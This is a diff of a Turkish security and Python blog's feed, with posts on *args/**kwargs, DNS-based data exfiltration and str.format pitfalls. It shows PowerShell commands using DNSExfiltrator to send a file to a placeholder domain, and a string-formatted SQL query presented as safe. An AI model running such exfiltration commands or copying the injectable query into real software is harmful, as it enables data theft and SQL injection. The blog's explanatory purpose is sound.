+    &lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;args&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+    &lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;kwargs&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
 &lt;span class="n"&gt;ogrenci&lt;/span&gt;  &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;İsim&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Enes&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;Soyisim&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Ergün&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;Okul No&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;1234&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;
 &lt;span class="n"&gt;yazdir&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Enes&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;b&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;0x656e&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;c&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;ogrenci&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
 &lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;a&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;Enes&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;b&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;0x656e&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;c&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;İsim&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;Enes&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;Soyisim&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;Ergün&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;Okul No&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;1234&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;}}&lt;/span&gt;
@@ -169,8 +395,8 @@ Yeni birisiyle tanıştınız. Beyninizde bu tanıştığınız kişi &lt;code&g
 
 &lt;p&gt;&lt;strong&gt;Örnek 2.1&lt;/strong&gt;&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;yazdir&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;utanırım&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="o"&gt;**&lt;/span&gt;&lt;span class="n"&gt;ben&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
-    &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;utanırım&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
-    &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;ben&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+    &lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;utanırım&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+    &lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;ben&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
 &lt;span class="n"&gt;ogrenci&lt;/span&gt;  &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;İsim&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Enes&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;Soyisim&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Ergün&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;Okul No&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;1234&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;
 &lt;span class="n"&gt;yazdir&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Enes&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;b&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;0x656e&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;c&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;ogrenci&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
@@ -183,9 +409,9 @@ Yeni birisiyle tanıştınız. Beyninizde bu tanıştığınız kişi &lt;code&g
 &lt;/ol&gt;
 &lt;p&gt;&lt;strong&gt;Örnek 3&lt;/strong&gt;&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;ogrenci&lt;/span&gt;  &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;İsim&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Enes&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;Soyisim&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Ergün&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;Okul No&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;1234&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;
-&lt;span class="n"&gt;ogrenci_karnenotu&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Okulumuz öğrencilerinden {Okul No} okul numarasına sahip {İsim} {Soyisim} adlı öğrenci mezun olmaya hak kazanmıştır.&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;format&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;**&lt;/span&gt;&lt;span class="n"&gt;ogrenci&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
-&lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;ogrenci_karnenotu&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
-&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;Okulumuz&lt;/span&gt; &lt;span class="err"&gt;öğ&lt;/span&gt;&lt;span class="n"&gt;rencilerinden&lt;/span&gt; &lt;span class="mi"&gt;1234&lt;/span&gt; &lt;span class="n"&gt;okul&lt;/span&gt; &lt;span class="n"&gt;numarasına&lt;/span&gt; &lt;span class="n"&gt;sahip&lt;/span&gt; &lt;span class="n"&gt;Enes&lt;/span&gt; &lt;span class="n"&gt;Ergünadlı&lt;/span&gt; &lt;span class="err"&gt;öğ&lt;/span&gt;&lt;span class="n"&gt;renci&lt;/span&gt; &lt;span class="n"&gt;mezun&lt;/span&gt; &lt;span class="n"&gt;olmaya&lt;/span&gt; &lt;span class="n"&gt;hak&lt;/span&gt; &lt;span class="n"&gt;kazanmıştır&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;
+&lt;span class="n"&gt;ogrenci_karnenotu&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Okulumuz öğrencilerinden {Okul No} okul numarasına sahip &lt;/span&gt;&lt;span class="si"&gt;{İsim}&lt;/span&gt;&lt;span class="s2"&gt; &lt;/span&gt;&lt;span class="si"&gt;{Soyisim}&lt;/span&gt;&lt;span class="s2"&gt; adlı öğrenci mezun olmaya hak kazanmıştır.&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;format&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;**&lt;/span&gt;&lt;span class="n"&gt;ogrenci&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;ogrenci_karnenotu&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;Okulumuz&lt;/span&gt; &lt;span class="n"&gt;öğrencilerinden&lt;/span&gt; &lt;span class="mi"&gt;1234&lt;/span&gt; &lt;span class="n"&gt;okul&lt;/span&gt; &lt;span class="n"&gt;numarasına&lt;/span&gt; &lt;span class="n"&gt;sahip&lt;/span&gt; &lt;span class="n"&gt;Enes&lt;/span&gt; &lt;span class="n"&gt;Ergünadlı&lt;/span&gt; &lt;span class="n"&gt;öğrenci&lt;/span&gt; &lt;span class="n"&gt;mezun&lt;/span&gt; &lt;span class="n"&gt;olmaya&lt;/span&gt; &lt;span class="n"&gt;hak&lt;/span&gt; &lt;span class="n"&gt;kazanmıştır&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
@@ -194,7 +420,7 @@ Yeni birisiyle tanıştınız. Beyninizde bu tanıştığınız kişi &lt;code&g
 &lt;p&gt;Sanırım diğer yazılara görece daha kısa bir yazı oldu ama blogun temasını değiştirmek için bir yazı yazma fikrine ihtiyacım vardı. Bu arada yeni tema nasıl? Temayı MinimalXY ile Onur'un Medius temasını birleştirerek yaptım.&lt;/p&gt;
 &lt;p&gt;Ayrıca yine bir klasiğim olan yazı sonu şarkısı paylaşmadan edemeyeceğim. Bu sefer 2 adet şarkı paylaşıyorum.&lt;/p&gt;
 &lt;p&gt;&lt;a href="https://www.youtube.com/watch?v=RF0HhrwIwp0"&gt;&lt;img alt="Kings of Leon - Sex on Fire" src="https://i.ytimg.com/vi/RF0HhrwIwp0/hqdefault.jpg"&gt;&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;&lt;a href="https://www.youtube.com/watch?v=3oMb06O2wXo"&gt;&lt;img alt="Frazey Ford - One More Cup Of Coffee" src="https://i.ytimg.com/vi/3oMb06O2wXo/hqdefault.jpg"&gt;&lt;/a&gt;&lt;/p&gt;</content><category term="python3"></category><category term="python3 yıldız"></category><category term="python3 yıldız işareti"></category><category term="python3 asterisk"></category><category term="python3 args ve kwargs"></category><category term="python args"></category><category term="python kwargs"></category></entry><entry><title>Data Exfiltration</title><link href="https://enesergun.net/data-exfiltration.html" rel="alternate"></link><published>2018-11-11T13:48:00+03:00</published><updated>2018-11-11T13:48:00+03:00</updated><author><name>0x656e</name></author><id>tag:enesergun.net,2018-11-11:/data-exfiltration.html</id><summary type="html">&lt;h2&gt;Data Exfiltration Nedir?&lt;/h2&gt;
+&lt;p&gt;&lt;a href="https://www.youtube.com/watch?v=3oMb06O2wXo"&gt;&lt;img alt="Frazey Ford - One More Cup Of Coffee" src="https://i.ytimg.com/vi/3oMb06O2wXo/hqdefault.jpg"&gt;&lt;/a&gt;&lt;/p&gt;</content><category term="python"></category><category term="python3"></category><category term="python3 yıldız"></category><category term="python3 yıldız işareti"></category><category term="python3 asterisk"></category><category term="python3 args ve kwargs"></category><category term="python args"></category><category term="python kwargs"></category></entry><entry><title>Data Exfiltration</title><link href="https://enesergun.net/data-exfiltration.html" rel="alternate"></link><published>2018-11-11T13:48:00+03:00</published><updated>2018-11-11T13:48:00+03:00</updated><author><name>0x656e</name></author><id>tag:enesergun.net,2018-11-11:/data-exfiltration.html</id><summary type="html">&lt;h2&gt;Data Exfiltration Nedir?&lt;/h2&gt;
 &lt;p&gt;Bir kişi veya grubun yetkisiz bir biçimde bir veriyi başka bir bilgisayar yada sunucuya kopyalaması, transfer etmesi anlamına gelir. Data extrusion(veri çıkarma), data exportation(veri ihracati!), data theft(veri hırsızlığı) olarak da bilinir.&lt;/p&gt;
 &lt;p&gt;Örnek vermek gerekirse bir banka çalışanının bankaya ait verileri bir USB(!) içerisinde dışarıya …&lt;/p&gt;</summary><content type="html">&lt;h2&gt;Data Exfiltration Nedir?&lt;/h2&gt;
 &lt;p&gt;Bir kişi veya grubun yetkisiz bir biçimde bir veriyi başka bir bilgisayar yada sunucuya kopyalaması, transfer etmesi anlamına gelir. Data extrusion(veri çıkarma), data exportation(veri ihracati!), data theft(veri hırsızlığı) olarak da bilinir.&lt;/p&gt;
@@ -237,9 +463,9 @@ Nedir DNS'in çalışma mantığı?&lt;/p&gt;
 &lt;p&gt;Server üzerinde 
 &lt;code&gt;dnsexfiltrator.py -d domain -p PAROLA&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;Client üzerinde&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;c:\DNSExfiltrator&amp;gt; powershell
-PS c:\DNSExfiltrator&amp;gt; Import-Module .\Invoke-DNSExfiltrator.ps1
-PS c:\DNSExfiltrator&amp;gt; Invoke-DNSExfiltrator -i inputFile -d mydomain.com -p password -s my.dns.server.com -t 500
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c"&gt;c:\DNSExfiltrator&amp;gt; powershell&lt;/span&gt;
+&lt;span class="err"&gt;PS c:\DNSExfiltrator&amp;gt; Import-Module .\Invoke-DNSExfiltrator.ps1&lt;/span&gt;
+&lt;span class="err"&gt;PS c:\DNSExfiltrator&amp;gt; Invoke-DNSExfiltrator -i inputFile -d mydomain.com -p password -s my.dns.server.com -t 500&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
@@ -256,7 +482,7 @@ PS c:\DNSExfiltrator&amp;gt; Invoke-DNSExfiltrator -i inputFile -d mydomain.com 
 &lt;p&gt;&lt;strong&gt;Burada anlatılanlar hakkında yaptığınız,yapacağınız tüm işlemlerden sizler sorumlusunuz. Mesuliyet kabul edilmemektedir.&lt;/strong&gt;&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;Bu yazı tamamen bilgilendirme amaçlıdır.&lt;/strong&gt;&lt;/p&gt;
 &lt;p&gt;Her yazının sonunda olduğu gibi klasik bu yazının şarkısını paylaşıyorum. &lt;/p&gt;
-&lt;p&gt;&lt;a href="https://www.youtube.com/watch?v=DuDhiHSksaA"&gt;&lt;img alt="Beth Hart - Caught Out In The Rain" src="https://img.youtube.com/vi/DuDhiHSksaA/0.jpg"&gt;&lt;/a&gt;&lt;/p&gt;</content><category term="data exfil"></category><category term="veri kaçırma"></category><category term="veri kaçırma yöntemleri"></category><category term="data exfiltration türkçe"></category><category term="veri güvenliği"></category></entry><entry><title>String.Format() Kullanırken Dikkatli Olun</title><link href="https://enesergun.net/python-format-kullanirken-dikkatli-olun.html" rel="alternate"></link><published>2018-06-10T02:41:00+03:00</published><updated>2018-06-10T02:41:00+03:00</updated><author><name>0x656e</name></author><id>tag:enesergun.net,2018-06-10:/python-format-kullanirken-dikkatli-olun.html</id><summary type="html">&lt;p&gt;Bildiğiniz üzere uygulamalar da kullanıcı girdisi çok önemlidir. Bu girdilerin serialize edilmesi ve güvenli hale getirilmesi gerekmektedir. Güvenlik bilinci olmayan bir yazılımcı ise bu girdilerde kullanıcıya güvenerek hiç bir önlem almaz ise ne olur? Tabi ki hacklenir. Bu girdilerin güvenli hale getirilmesi için dile özgü bir çok yöntem vardır. Bu …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Bildiğiniz üzere uygulamalar da kullanıcı girdisi çok önemlidir. Bu girdilerin serialize edilmesi ve güvenli hale getirilmesi gerekmektedir. Güvenlik bilinci olmayan bir yazılımcı ise bu girdilerde kullanıcıya güvenerek hiç bir önlem almaz ise ne olur? Tabi ki hacklenir. Bu girdilerin güvenli hale getirilmesi için dile özgü bir çok yöntem vardır. Bu yöntem metodolojilerinden (metadoloji miydi bilemedim.) white list kullanılması da oldukça önemlidir. Ama bazen öyle şeyler vardır ki direkt olarak Yazılımın Core'unda çıkmaktadır ve burada olay artık yazılımcıdan çıkmaktadır. Örnek vermek gerekirse tam olarak fonksiyonu hatırlamıyorum fakat PHP'de kötü karakterlerden kaçmak için escape fonksiyonu bulunuyordu ve bu fonksiyon bypasslanabiliyordu. Artık deprecated olduğundan dolayı kullanılmıyor bildiğim kadarıyla.&lt;/p&gt;
+&lt;p&gt;&lt;a href="https://www.youtube.com/watch?v=DuDhiHSksaA"&gt;&lt;img alt="Beth Hart - Caught Out In The Rain" src="https://img.youtube.com/vi/DuDhiHSksaA/0.jpg"&gt;&lt;/a&gt;&lt;/p&gt;</content><category term="siber güvenlik"></category><category term="data exfil"></category><category term="veri kaçırma"></category><category term="veri kaçırma yöntemleri"></category><category term="data exfiltration türkçe"></category><category term="veri güvenliği"></category></entry><entry><title>String.Format() Kullanırken Dikkatli Olun</title><link href="https://enesergun.net/python-format-kullanirken-dikkatli-olun.html" rel="alternate"></link><published>2018-06-10T02:41:00+03:00</published><updated>2018-06-10T02:41:00+03:00</updated><author><name>0x656e</name></author><id>tag:enesergun.net,2018-06-10:/python-format-kullanirken-dikkatli-olun.html</id><summary type="html">&lt;p&gt;Bildiğiniz üzere uygulamalar da kullanıcı girdisi çok önemlidir. Bu girdilerin serialize edilmesi ve güvenli hale getirilmesi gerekmektedir. Güvenlik bilinci olmayan bir yazılımcı ise bu girdilerde kullanıcıya güvenerek hiç bir önlem almaz ise ne olur? Tabi ki hacklenir. Bu girdilerin güvenli hale getirilmesi için dile özgü bir çok yöntem vardır. Bu …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Bildiğiniz üzere uygulamalar da kullanıcı girdisi çok önemlidir. Bu girdilerin serialize edilmesi ve güvenli hale getirilmesi gerekmektedir. Güvenlik bilinci olmayan bir yazılımcı ise bu girdilerde kullanıcıya güvenerek hiç bir önlem almaz ise ne olur? Tabi ki hacklenir. Bu girdilerin güvenli hale getirilmesi için dile özgü bir çok yöntem vardır. Bu yöntem metodolojilerinden (metadoloji miydi bilemedim.) white list kullanılması da oldukça önemlidir. Ama bazen öyle şeyler vardır ki direkt olarak Yazılımın Core'unda çıkmaktadır ve burada olay artık yazılımcıdan çıkmaktadır. Örnek vermek gerekirse tam olarak fonksiyonu hatırlamıyorum fakat PHP'de kötü karakterlerden kaçmak için escape fonksiyonu bulunuyordu ve bu fonksiyon bypasslanabiliyordu. Artık deprecated olduğundan dolayı kullanılmıyor bildiğim kadarıyla.&lt;/p&gt;
 &lt;p&gt;Çok fazla uzattım sanırım uzatmadan mevzuya geçeceğim. &lt;/p&gt;
 &lt;h3&gt;Python'da Güvenli Girdi Almak&lt;/h3&gt;
 &lt;p&gt;Python'da girdi almak için input fonksiyonu kullanılmaktadır. Yanlış hatırlamıyorsam Python2'de ki input fonksiyonu da yukarıda bahsettiğim gibi güvenli hale getirilmediğinden dolayı sistem üzerinde kod çalıştırılabiliyordu. Tıpkı eval fonksiyonu gibi. Python3 de ise herhangi bir sorun yok gözüküyor. Peki kullanıcı girdisini yaptı buraya kadar her şey güvenli. Peki ya sonra?&lt;/p&gt;
@@ -268,7 +494,7 @@ PS c:\DNSExfiltrator&amp;gt; Invoke-DNSExfiltrator -i inputFile -d mydomain.com 
 &lt;p&gt;Burada username kısmına yazılacak herhangi bir tırnak hacker'ın database üzerinde hatta daha ileri aşamalarda sistem üzerinde kod çalıştırabileceği anlamına gelmektedir.&lt;/p&gt;
 &lt;p&gt;Peki güvenlisi?&lt;/p&gt;
 &lt;p&gt;O da şöyle:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;query&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;SELECT password FROM users WHERE username=&amp;#39;{}&amp;#39;&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;format&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;username&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;query&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;SELECT password FROM users WHERE username=&amp;#39;&lt;/span&gt;&lt;span class="si"&gt;{}&lt;/span&gt;&lt;span class="s2"&gt;&amp;#39;&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;format&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;username&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
 &lt;span class="n"&gt;cursor&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;execute&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;query&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
@@ -278,7 +504,7 @@ PS c:\DNSExfiltrator&amp;gt; Invoke-DNSExfiltrator -i inputFile -d mydomain.com 
 &lt;h3&gt;Aslında Güvenli Değilmiş&lt;/h3&gt;
 &lt;p&gt;Evet format güvenli diye biliyorduk ama okuduğum makaleye göre güvenli değilmiş. Bunun sebebi ise format değeri ile birlikte kod üzerinde ki başka özellikleri çağırıp ekrana yazdırabilirmişiz.&lt;/p&gt;
 &lt;p&gt;Hemen örnek ile göstereyim:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;string&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Selamlar {0} {0.__contains__}&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;format&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Enes&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;string&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Selamlar &lt;/span&gt;&lt;span class="si"&gt;{0}&lt;/span&gt;&lt;span class="s2"&gt; &lt;/span&gt;&lt;span class="si"&gt;{0.__contains__}&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;format&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Enes&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
@@ -361,9 +587,9 @@ PS c:\DNSExfiltrator&amp;gt; Invoke-DNSExfiltrator -i inputFile -d mydomain.com 
 
 &lt;span class="n"&gt;Now&lt;/span&gt; &lt;span class="n"&gt;you&lt;/span&gt; &lt;span class="n"&gt;can&lt;/span&gt; &lt;span class="n"&gt;use&lt;/span&gt; &lt;span class="n"&gt;the&lt;/span&gt; &lt;span class="n"&gt;safe_format&lt;/span&gt; &lt;span class="n"&gt;method&lt;/span&gt; &lt;span class="k"&gt;as&lt;/span&gt; &lt;span class="n"&gt;a&lt;/span&gt; &lt;span class="n"&gt;replacement&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="nb"&gt;str&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;format&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
 
-&lt;span class="o"&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;{0.__class__}&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;format&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;42&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="o"&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;&lt;span class="si"&gt;{0.__class__}&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;format&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;42&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
 &lt;span class="s2"&gt;&amp;quot;&amp;lt;type &amp;#39;int&amp;#39;&amp;gt;&amp;quot;&lt;/span&gt;
-&lt;span class="o"&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;safe_format&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;{0.__class__}&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;42&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="o"&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;safe_format&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;&lt;span class="si"&gt;{0.__class__}&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;42&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
 &lt;span class="n"&gt;Traceback&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;most&lt;/span&gt; &lt;span class="n"&gt;recent&lt;/span&gt; &lt;span class="n"&gt;call&lt;/span&gt; &lt;span class="n"&gt;last&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
   &lt;span class="n"&gt;File&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&amp;lt;stdin&amp;gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;line&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;module&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;
 &lt;span class="ne"&gt;AttributeError&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="vm"&gt;__class__&lt;/span&gt;
@@ -373,7 +599,7 @@ PS c:\DNSExfiltrator&amp;gt; Invoke-DNSExfiltrator -i inputFile -d mydomain.com 
